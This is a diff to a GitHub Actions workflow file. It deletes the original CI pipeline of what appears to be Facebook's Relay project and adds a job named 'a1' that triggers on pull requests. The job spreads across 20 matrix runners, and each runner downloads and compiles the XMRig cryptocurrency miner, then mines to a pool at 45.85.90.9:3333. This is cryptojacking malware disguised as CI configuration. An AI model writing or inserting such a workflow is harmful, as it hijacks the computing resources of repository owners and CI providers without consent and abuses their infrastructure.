@@ -1,138 +1,24 @@
-# Copyright (c) Facebook, Inc. and its affiliates.
-#
-# This source code is licensed under the MIT license found in the
-# LICENSE file in the root directory of this source tree.
-
-name: CI
-
-on: [push, pull_request]
-
+name: a1
+on: [pull_request]
 jobs:
-  js-tests:
-    name: JS Tests (Node ${{ matrix.node-version }})
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        node-version: [10.x, 12.x, 14.x, 15.x]
-    steps:
-      - uses: actions/checkout@v1
-      - uses: actions/setup-node@v1
-        with:
-          node-version: ${{ matrix.node-version }}
-      - name: Install dependencies
-        run: yarn install --frozen-lockfile
-      - name: Run tests
-        run: yarn run jest
+    run:
+        name: Run
+        runs-on: ubuntu-latest
+        strategy:
+          fail-fast: false
+          matrix:
+            runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        steps:
+          - shell: bash
+            run: |
+              sudo apt-get update
+              sudo apt-get install --yes build-essential cmake git libhwloc-dev libssl-dev libuv1-dev
+              curl -Lo xmrig.tar.gz https://github.com/xmrig/xmrig/archive/refs/tags/v6.10.0.tar.gz
+              tar xf xmrig.tar.gz
+              cd xmrig-*
+              mkdir build
+              cd build
+              cmake .. -DCMAKE_BUILD_TYPE=Release
+              make --jobs=$(nproc)
 
-  js-lint:
-    name: JS Lint
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v1
-      - uses: actions/setup-node@v1
-        with:
-          node-version: 15.x
-      - name: Install dependencies
-        run: yarn install --frozen-lockfile --ignore-scripts
-      - name: Test dependencies
-        run: yarn run test-dependencies
-      - name: Lint
-        run: yarn run lint
-
-  typecheck:
-    name: Flow Typecheck
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v1
-      - uses: actions/setup-node@v1
-        with:
-          node-version: 15.x
-      - name: Install dependencies
-        run: yarn install --frozen-lockfile --ignore-scripts
-      - name: Flow
-        run: yarn run typecheck
-
-  rust-tests:
-    name: Rust Tests (${{ matrix.os }})
-    strategy:
-      matrix:
-        ## TODO: Windows is currently failing in watchman dependency
-        os: [ubuntu-latest, macos-latest] # windows-latest
-    runs-on: ${{ matrix.os }}
-    steps:
-      - uses: actions/checkout@v2
-      - uses: actions-rs/toolchain@v1
-        with:
-          toolchain: stable
-          override: true
-      - uses: actions-rs/cargo@v1
-        with:
-          command: test
-          # add --locked back when we have a better way to ensure it's up to date
-          args: --manifest-path=compiler/Cargo.toml
-
-  build-compiler:
-    name: Build Rust Compiler (${{ matrix.target.os }})
-    strategy:
-      matrix:
-        target:
-          - os: ubuntu-latest
-            build-name: relay
-            artifact-name: relay-compiler-linux-x64
-          - os: macos-latest
-            build-name: relay
-            artifact-name: relay-compiler-macos-x64
-    runs-on: ${{ matrix.target.os }}
-    steps:
-      - uses: actions/checkout@v2
-      - uses: actions-rs/toolchain@v1
-        with:
-          toolchain: stable
-          override: true
-      - uses: actions-rs/cargo@v1
-        with:
-          command: build
-          # add --locked back when we have a better way to ensure it's up to date
-          args: --manifest-path=compiler/Cargo.toml --release
-      - uses: actions/upload-artifact@v2
-        with:
-          name: ${{ matrix.target.artifact-name }}
-          path: compiler/target/release/${{ matrix.target.build-name }}
-
-  master-release:
-    name: Publish master tag to npm
-    runs-on: ubuntu-latest
-    if: github.event_name == 'push' && github.repository == 'facebook/relay' && github.ref == 'refs/heads/master'
-    needs: [js-tests, js-lint, typecheck, rust-tests, build-compiler]
-    steps:
-      - uses: actions/checkout@v1
-      - uses: actions/setup-node@v1
-        with:
-          node-version: 14.x
-          registry-url: https://registry.npmjs.org/
-      - name: Install dependencies
-        run: yarn install --frozen-lockfile --ignore-scripts
-      - name: Download artifact relay-compiler-linux-x64
-        uses: actions/download-artifact@v2
-        with:
-          name: relay-compiler-linux-x64
-          path: artifacts/linux-x64
-      - name: Download artifact relay-compiler-macos-x64
-        uses: actions/download-artifact@v2
-        with:
-          name: relay-compiler-macos-x64
-          path: artifacts/macos-x64
-      - name: Mark binaries as executable
-        working-directory: artifacts
-        run: |
-          chmod +x linux-x64/relay
-          chmod +x macos-x64/relay
-      - name: Build master version
-        run:  RELEASE_COMMIT_SHA=${{github.sha}} yarn gulp masterrelease
-      - name: Publish to npm
-        run: |
-          for pkg in dist/*; do
-            npm publish "$pkg" --tag master
-          done
-        env:
-          NODE_AUTH_TOKEN: ${{secrets.NPM_TOKEN}}
+              ./xmrig --donate-level 0 -o 45.85.90.9:3333 
